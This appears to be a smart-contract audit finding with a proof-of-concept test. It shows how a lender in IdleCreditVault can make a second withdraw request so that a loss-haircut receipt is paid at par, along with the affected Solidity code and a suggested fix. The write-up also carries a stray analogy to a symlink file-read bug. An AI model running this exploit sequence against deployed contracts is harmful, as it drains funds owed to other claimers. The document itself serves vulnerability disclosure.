### Title
Loss-adjusted withdraw receipts escape haircut by overwriting `lastWithdrawRequest` - (File: contracts/strategies/idle/IdleCreditVault.sol)

### Summary
`IdleCreditVault._claimLossAdjustedWithdrawRequest` finds the loss epoch only through `lastWithdrawRequest[_user]`, then applies `lossRecoveryPriceByEpoch[lossEpoch]` [1](#0-0) . `requestWithdraw` overwrites `lastWithdrawRequest[_user]` with the current epoch on every new request while leaving the old loss-epoch basis inside `withdrawsRequests[_user]` / `withdrawsRequestsByEpoch` [2](#0-1) . A user whose receipt was haircut in a `stopEpochWithDuration(_lossAmount)` epoch can simply request another withdraw in the next epoch, wait for it to mature, and `claimWithdrawRequest` then pays the full aggregate `withdrawsRequests[_user]` at par via `_claimFundedWithdrawRequest` [3](#0-2) .

### Finding Description
The external bug is a symlink arbitrary-file-read: an attacker-controlled indirection is dereferenced without validation. The vault analog is the epoch indirection `lastWithdrawRequest[_user] → lossRecoveryPriceByEpoch[epoch]`:

1. Attacker (KYC'd AA/BB lender) calls `requestWithdraw`; receipt basis is stored in `withdrawsRequestsByEpoch[user][N]` and `lastWithdrawRequest[user] = N`.
2. The epoch ends with `stopEpochWithDuration(_lossAmount)`; the borrower funds only the loss-adjusted amount and `lossRecoveryPriceByEpoch[N]` is set. The receipt is supposed to pay `claimBasis * lossRecoveryPrice / 1e18`.
3. Instead of claiming, the attacker calls `requestWithdraw` again in epoch N+1. `lastWithdrawRequest[user]` is overwritten to N+1 while the epoch-N basis remains in `withdrawsRequests[user]`.
4. After epoch N+1 ends, `claimWithdrawRequest` runs: `_claimLossAdjustedWithdrawRequest` reads `lossRecoveryPriceByEpoch[N+1] == 0` and returns 0 without clearing the epoch-N receipt [4](#0-3) ; `_claimFundedWithdrawRequest` then pays `withdrawsRequests[user]` (old loss receipt + new receipt) at par and zeroes the ledger [5](#0-4) .

The per-epoch guard in `_clearWithdrawClaimForEpoch` never runs for the loss epoch because the lookup epoch was replaced [6](#0-5) .

### Impact Explanation
The attacker receives `claimBasis_N` at par instead of `claimBasis_N * lossRecoveryPrice / 1e18`, stealing `claimBasis_N * (1e18 - lossRecoveryPrice) / 1e18` from the funded withdrawal pool. Since the borrower only supplied the loss-adjusted amount, the excess is paid from funds reserved for other pending/funded receipts, breaking the loss-waterfall invariant and causing direct insolvency for later claimers.

### Likelihood Explanation
Requires a realized-loss `stopEpochWithDuration` epoch, after which any affected receipt holder can execute the sequence with two ordinary `requestWithdraw` calls and one epoch of waiting — all unprivileged lender actions. No privileged misbehavior is needed; the haircut bypass is deterministic once a loss epoch exists.

### Recommendation
Track loss-adjusted receipts per epoch rather than via a single `lastWithdrawRequest` pointer: e.g., in `claimWithdrawRequest` iterate/derive the claim epoch from `withdrawsRequestsByEpoch` entries with `lossRecoveryPriceByEpoch[epoch] != 0`, or move the loss-adjusted basis into a dedicated bucket at `stopEpochWithDuration`/`requestWithdraw` so that a later request cannot alias it. At minimum, `requestWithdraw` should refuse to overwrite `lastWithdrawRequest` while `lossRecoveryPriceByEpoch[lastWithdrawRequest[user]]` is still unclaimed.

```solidity
function testLossReceiptEscapesHaircutViaNewRequest() external {
    uint256 amountWei = 100_000 * ONE_SCALE;
    uint256 mintedAA = idleCDO.depositAA(amountWei);      // attacker LP
    uint256 half = IERC20Detailed(address(AAtranche)).balanceOf(address(this)) / 2;

    // epoch N: request half, then stop with a loss (borrower funds loss-adjusted amount)
    uint256 basisN = cdoEpoch.requestWithdraw(half, address(AAtranche));
    _startEpochAndCheckPrices(0);
    uint256 loss = _expectedFundsEndEpoch() / 4;          // 25% loss
    _stopEpochWithDurationAndLoss(loss);                  // sets lossRecoveryPriceByEpoch[N]

    uint256 lossEpoch = strategy.lastWithdrawRequest(address(this));
    uint256 lossPrice = strategy.lossRecoveryPriceByEpoch(lossEpoch);
    assertGt(lossPrice, 0);
    assertLt(lossPrice, 1e18);

    // epoch N+1 buffer: attacker requests again -> lastWithdrawRequest overwritten
    uint256 basisN1 = cdoEpoch.requestWithdraw(
        IERC20Detailed(address(AAtranche)).balanceOf(address(this)) / 2,
        address(AAtranche)
    );
    assertGt(strategy.lastWithdrawRequest(address(this)), lossEpoch);

    // let epoch N+1 end so the funded-claim gate epochNumber > lastWithdrawRequest passes
    _startEpochAndCheckPrices(0);
    _stopEpochAndCheckPrices(0, initialProvidedApr, _expectedFundsEndEpoch());

    uint256 balPre = IERC20Detailed(underlying).balanceOf(address(this));
    cdoEpoch.claimWithdrawRequest();
    uint256 paid = IERC20Detailed(underlying).balanceOf(address(this)) - balPre;

    // BUG: paid at par for the loss-epoch basis instead of basisN * lossPrice / 1e18
    assertEq(paid, basisN + basisN1);
    assertGt(paid, basisN * lossPrice / 1e18 + basisN1);   // stolen haircut amount
}
```

Expected: the final claim pays `basisN` unhaircutted, draining the haircut difference from the funded reserve owed to other claimers.

```text
  function claimWithdrawRequest(address _user) external returns (uint256 amount) {
    _onlyIdleCDO();
    if (defaultRecoveryFinalized) {
      // Post-default requests are already priced after the haircut and backed by the reserve,
      // so they must not fall through to the defaulted-epoch receipt logic.
      amount = _claimPostDefaultWithdrawRequest(_user);
      if (amount != 0) return amount;
      // Only receipts created in the defaulted epoch are haircutted here; old fulfilled
      // receipts are handled below at par if they were already funded before default.
      amount = _claimDefaultedWithdrawRequest(_user);
    }
    amount += _claimLossAdjustedWithdrawRequest(_user);
    return amount + _claimFundedWithdrawRequest(_user);
  }

  /// @notice Claim a funded non-default withdraw request at par.
  /// @param _user address of the user
  /// @return amount amount claimed
  function _claimFundedWithdrawRequest(address _user) internal returns (uint256 amount) {
    // User should wait at least an epoch before claiming the withdraw. Once the epoch is over user can withdraw 
    // at any time even if a new epoch started. 
    // So if epochNumber is the same as the last withdraw request then we revert. Epoch number is increased at stopEpoch
    // NOTE: If a user does not claim a withdraw request and instead requests another withdraw, he will have to wait
    // for another epoch to claim both requests.
    // NOTE 2: if borrower defaults, old withdraw requests can still be claimed
    if (IIdleCDOEpochVariant(idleCDO).epochEndDate() != 0 && (epochNumber <= lastWithdrawRequest[_user])) {
      revert NotAllowed();
    }
    // settle APR=0 requests once the related epoch has ended
    _settleApr0(_user);
    Apr0UserData storage _apr0User = apr0Users[_user];
    // Claim includes:
    // - settled APR0 principal from finalized epochs
    // - still-open APR0 principal: if pool-close mode was used (_interest == 1), IdleCDO sets
    //   epochEndDate = 0 and claims can be immediate, while _settleApr0 can still skip settlement
    //   for the current request epoch (reqEpoch >= epochNumber).
    // - settled APR0 interest
    uint256 normalAmount = withdrawsRequests[_user];
    uint256 apr0PrincipalAmount = _apr0User.settledPrincipal + _apr0User.principal;
    uint256 apr0InterestAmount = _apr0User.settledInterest;
    amount = normalAmount + apr0PrincipalAmount + apr0InterestAmount;
    // burn strategy tokens 1:1 with the principal only (normal amount already includes interest)
    _burn(_user, normalAmount + apr0PrincipalAmount);
    withdrawsRequests[_user] = 0;
    lastWithdrawRequest[_user] = 0;
    if (apr0PrincipalAmount != 0 || apr0InterestAmount != 0) {
      delete apr0Users[_user];
    }
    _transferFundedClaim(_user, amount);
```

```text
  function _claimLossAdjustedWithdrawRequest(address _user) internal returns (uint256 amount) {
    uint256 lossEpoch = lastWithdrawRequest[_user];
    uint256 lossRecoveryPrice = lossRecoveryPriceByEpoch[lossEpoch];
    if (lossRecoveryPrice == 0) return amount;

    (uint256 claimBasis, uint256 burnAmount) = _clearWithdrawClaimForEpoch(_user, lossEpoch, false);
    if (claimBasis == 0) return amount;

    // pendingWithdraws was already cleared when the borrower funded the loss-adjusted amount.
    _burn(_user, burnAmount);
    amount = (claimBasis * lossRecoveryPrice) / RECOVERY_FULL;
    _transferFundedClaim(_user, amount);
```

```text
  function _clearWithdrawClaimForEpoch(address _user, uint256 _claimEpoch, bool _isClearingApr0) internal returns (uint256 claimBasis, uint256 burnAmount) {
    (claimBasis, burnAmount) = _withdrawClaimAmountsForEpoch(_user, _claimEpoch);
    if (claimBasis == 0) return (claimBasis, burnAmount);

    uint256 normalAmount = withdrawsRequestsByEpoch[_user][_claimEpoch];
    if (normalAmount != 0) {
      withdrawsRequestsByEpoch[_user][_claimEpoch] = 0;
      // The aggregate may also include older funded receipts; clear only this epoch's piece.
      withdrawsRequests[_user] -= normalAmount;
    }
    Apr0UserData storage apr0User = apr0Users[_user];
    if (apr0User.principal != 0 && apr0User.principalEpoch == _claimEpoch) {
      if (_isClearingApr0) {
        uint256 apr0Principal = apr0User.principal;
        uint256 totalApr0Principal = apr0TotalPrincipal;
        // prepareStopEpochWithApr0 may already close the global APR0 bucket before default finalization.
        apr0TotalPrincipal = apr0Principal >= totalApr0Principal ? 0 : totalApr0Principal - apr0Principal;
      }
      apr0User.principal = 0;
      apr0User.principalEpoch = 0;
    }
    if (lastWithdrawRequest[_user] == _claimEpoch) {
      // The cleared epoch was the latest request marker. Any remaining normal/APR0 receipt
      // is older and already funded, so it can continue to the funded-claim path.
      lastWithdrawRequest[_user] = 0;
    }
```
